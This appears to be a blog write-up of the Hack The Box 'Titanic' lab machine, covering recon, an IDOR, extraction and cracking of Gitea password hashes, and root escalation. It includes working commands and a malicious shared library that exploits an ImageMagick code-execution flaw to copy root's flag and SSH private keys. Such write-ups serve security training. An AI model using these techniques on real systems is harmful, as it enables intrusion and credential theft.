---
title: 【HTB Machine】Titanic
date: 2025-07-14
tags:
  - security
url: "/posts/HTB/Titanic/"
---

# Recon

```sh
nmap -sS -A -p- --min-rate 10000 -oN nmap.txt Remote_IP
```

![nmap](/images/htb/titanic/nmap.png)

```sh
echo 'Remote_IP titanic.htb' | sudo tee -a /etc/hosts
```

# Web on titanic.htb port 80

![web](/images/htb/titanic/web_on_port_80_1.png)

![web](/images/htb/titanic/web_on_port_80_2.png)

Burp 攔截封包

![post_catch](/images/htb/titanic/post_catch.png)

![catch2](/images/htb/titanic/catch2.png)

IDOR vulnerability

![IDOR](/images/htb/titanic/IDOR.png)

發現有個 `dev` subdomain

```sh
echo 'Remote_IP dev.titanic.htb' | sudo tee -a /etc/hosts
```

# Web on dev.titanic.htb

![gitea](/images/htb/titanic/gitea.png)

可以得到 source code

- gitea 設定檔

![app_ini](/images/htb/titanic/app_ini.png)

- SQLite 資料庫

![sqlite](/images/htb/titanic/sqlite.png)

需要先轉換一下格式

```sh
sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo "$data" | cut -d '|' -f3); echo "${name}:sha256:${salt}:${digest}"; done | tee hashes.txt
```

hashcat 爆破

```sh
hashcat hashes.txt /usr/share/wordlists/rockyou.txt --user
```

得到 developer 密碼，登入 ssh

```sh
ssh developer@Remote_IP
cat ~/user.txt
```

# Privilege Escalation

```sh
$ ls /opt
app containerd scripts

$ ls /opt/scripts
identify_images.sh

$ cat /opt/scripts/identify_images.sh
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log

$ magick --version
Version: ImageMagick 7.1.1-35 ...
```

經搜尋後發現有個任意程式碼執行漏洞

![magick](/images/htb/titanic/magick.png)

偷 root flag/ssh private key

```sh
$ gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
> #include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void __attribute__((constructor)) init() {
    system("cat /root/root.txt > /tmp/root.txt");
    system("cat /root/.ssh/* > /tmp/id_rsa");
    exit(0);
}
> EOF
$ cd /opt/app/static/assets/images
$ cp entertainment.jpg root.jpg
$ rm root.jpg
$ cp entertainment.jpg root.jpg
$ cat /tmp/root.txt
{ROOT_FLAG_HERE}
```
